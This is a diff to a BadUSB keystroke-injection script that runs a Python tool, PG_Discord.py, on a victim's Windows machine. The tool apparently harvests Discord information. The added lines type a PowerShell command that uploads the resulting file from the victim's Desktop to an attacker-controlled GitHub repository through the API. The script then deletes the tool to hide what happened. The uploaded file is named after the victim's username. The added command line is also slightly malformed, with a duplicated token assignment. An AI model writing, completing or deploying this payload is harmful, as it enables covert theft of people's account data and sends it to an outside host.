@@ -29,8 +29,14 @@ STRING python PG_Discord.py
 DELAY 1000
 ENTER
 
+REM saves info to github change GITHUB TOKEN HERE and USERNAME/GITHUB REPO HERE
+DELAY 10000
+STRING $token="$token="GITHUB TOKEN HERE"; $repo="USERNAME/GITHUB REPO HERE"; $username=$env:USERNAME; $filename="${username}_Discord.txt"; $uri="https://api.github.com/repos/$repo/contents/$filename"; $file="$env:USERPROFILE\Desktop\$filename"; try{$existingData=Invoke-RestMethod -Uri $uri -Headers @{Authorization="Bearer $token"} -Method GET; $existingDecoded=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($existingData.content)); $sha=$existingData.sha}catch{$existingDecoded="";$sha=$null}; $newContent=$existingDecoded+"`n"+(Get-Content $file -Raw); $body=@{message="update $filename";content=[Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($newContent))}; if($sha){$body.sha=$sha}; $bodyJson=$body|ConvertTo-Json; Invoke-RestMethod -Uri $uri -Headers @{Authorization="Bearer $token"} -Method Put -Body $bodyJson
+DELAY 1000
+ENTER
+
 REM removed PG_Discord.py and exits powershell
-DELAY 15000
+DELAY 1000
 STRING Remove-Item -Path (Join-Path $env:USERPROFILE "Desktop\PG_Discord.py") -Force
 ENTER
 DELAY 1000
